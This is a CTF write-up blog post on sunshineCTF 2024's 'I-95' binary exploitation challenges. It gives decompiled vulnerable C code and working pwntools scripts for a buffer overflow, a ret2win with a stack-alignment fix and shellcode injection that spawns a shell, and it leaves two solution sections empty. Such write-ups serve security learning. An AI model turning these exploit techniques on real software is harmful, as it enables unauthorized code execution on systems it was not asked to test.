---
layout: post
title:  sunshineCTF 2024
---
- [https://ctftime.org/event/2485](https://ctftime.org/event/2485)
- Oct 19 - Oct 21

# My Solves/Writeups

## I-95 (Quick Pwn)

| Challenge Name      | Difficulty | Points | Writeup                 |
| ------------------- | ---------- | ------ | ----------------------- |
| i-95/Melbourne      | Easy       | 10     | [jump](#i-95melbourne)     |
| i-95/Cape Canaveral | Easy       | 10     | [jump](#i-95capecanaveral) |
| i-95/Palm Beach     | Medium     | 10     | [jump](#i-95palmbeach)     |
| i-95/Fort Pierce    | Medium     | 10     | [jump](#i-95fortpierce)    |
| i-95/Jupiter        | Medium     | 86     | [jump](#i-95jupiter)       |

## Writeups

### i-95/Melbourne

Drive on down the I-95 to your favorite cities along the way! First up: Melbourne!

Attachments: [melbourne](https://2024.sunshinectf.games/36fea04521ee/melbourne)

nc 2024.sunshinectf.games 24601

### Solution

Looking at the code from the disassembly, we can see that we are trying to modify `s1` to be `0xdeadbeef` without direct access to the variable.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+8h] [rbp-158h]
  char v6[112]; // [rsp+10h] [rbp-150h] BYREF
  char s[112]; // [rsp+80h] [rbp-E0h] BYREF
  char s1[104]; // [rsp+F0h] [rbp-70h] BYREF
  unsigned __int64 v9; // [rsp+158h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  fflush(stdout);
  fflush(stdin);
  fgets(s, 140, stdin);
  if ( !strncmp(s1, "0xdeadbeef", 0xAuLL) )
  {
    stream = fopen("flag.txt", "r");
    if ( stream )
    {
      fgets(v6, 99, stream);
      printf("Flag is: %s\n", v6);
      fclose(stream);
    }
    else
    {
      puts("There was an issue opening the file.");
    }
  }
  return v9 - __readfsqword(0x28u);
}
```

Fortunately, the variable `s` that our input is taken in to should only be storing 112 bytes, but can take in 140 bytes.

We can overflow the buffer of `s` and write `0xdeadbeef` into `s1` with this.

Exploit: Use 112 bytes of padding the write `0xdeadbeef`: `aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaa0xdeadbeef`

### i-95/Cape Canaveral

Drive your way to the greatest Space Coast in the United States!

Attachments: [cape_canaveral](https://2024.sunshinectf.games/f98149e6f798/canaveral)

nc 2024.sunshinectf.games 24602

### Solution

Looking at the code from the disassembly, we can see that the challenge is a simple ret2win.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  fflush(stdout);
  fflush(stdin);
  return func0();
}

__int64 func0()
{
  _BYTE v1[112]; // [rsp+0h] [rbp-70h] BYREF

  printf("Enter the launch command: ");
  return gets(v1);
}

int win()
{
  return system("/bin/sh");
}
```

We can write a simple script with pwntools that returns to the win function after filling up the buffer.

```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './canaveral'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

offset = 120

io = start()

payload = flat({
    offset: [
        elf.sym['win']
    ]
})

io.sendlineafter(b':', payload)
io.interactive()
```

When we try running this, we still don't get the shell.

Analyzing with gdb, we see that the mov instruction is used to move the address of the win function into the rdi register, but the address is not aligned properly.

<img width="870" alt="Screenshot 2024-10-24 at 2 05 12â€¯PM" src="https://github.com/user-attachments/assets/52a8134c-a1ad-483b-bae0-6b95746bbc8e">

To fix this issue, we can either return to a further address in win so the address is aligned properly, or we can use a ret address to align the address properly.

We can find the single ret address with
`objdump -d canaveral | grep ret` or
`ROPgadget --binary canaveral | grep ret`

Final exploit:
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './canaveral'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

offset = 120

io = start()

payload = flat({
    offset: [
        0x40101a, # ret address
        elf.sym['win']
    ]
})

io.sendlineafter(b':', payload)
io.interactive()
```

### i-95/Palm Beach

Get your tan on

Attachments: [palm_beach](https://2024.sunshinectf.games/76dd136bd7d8/palmbeach)

nc 2024.sunshinectf.games 24603

### Solution

Looking at the protections on the binary, we can see that The stack is executable, meaning that injecting shellcode is likely possible.

```bash
root@pwnhub:/workspace/ctfs/sunshineCTF/pwn/palm_beach# checksec --file palmbeach
[*] '/workspace/ctfs/sunshineCTF/pwn/palm_beach/palmbeach'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    RUNPATH:    b'$ORIGIN'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The code from the disassembly shows that the program prints out the address to the variable that we can write to.

```c
__int64 func0()
{
  _BYTE v1[160]; // [rsp+0h] [rbp-A0h] BYREF

  printf("Speed limit: %p\n", v1);
  return gets(v1);
}
```

Since our stack is executable, we can write our shellcode straight to the `v1` variable and if our return at the end of this function returns to the same `v1` variable, our shellcode gets executed.

For our payload to fill the rest of the variable, we can use `asm('nop')` because it is a single byte instruction that does nothing and won't be executed.

Final exploit:
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './palmbeach'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

# Offset to EIP
padding = 168

# Grab speed limit address
speed_limit = int(io.recvline().split(b" ")[-1].strip(), 16)
info(f'speed_limit address %#x: {speed_limit}')

shellcode = asm(shellcraft.sh())

payload = flat(
    shellcode,
    asm('nop') * (padding - len(shellcode)),
    speed_limit
)

io.sendline(payload)
io.interactive()
```

### i-95/Fort Pierce

Uhh, it's another city along I-95, not much else of interest.

Attachments: [fort_pierce](https://2024.sunshinectf.games/d6d8ba1e7b55/fortpierce)

nc 2024.sunshinectf.games 24606

### Solution

### i-95/Jupiter

Do boys or girls go here?

Attachments: [jupiter](https://2024.sunshinectf.games/7890a9fcaffb/jupiter)

nc 2024.sunshinectf.games 24609

### Solution
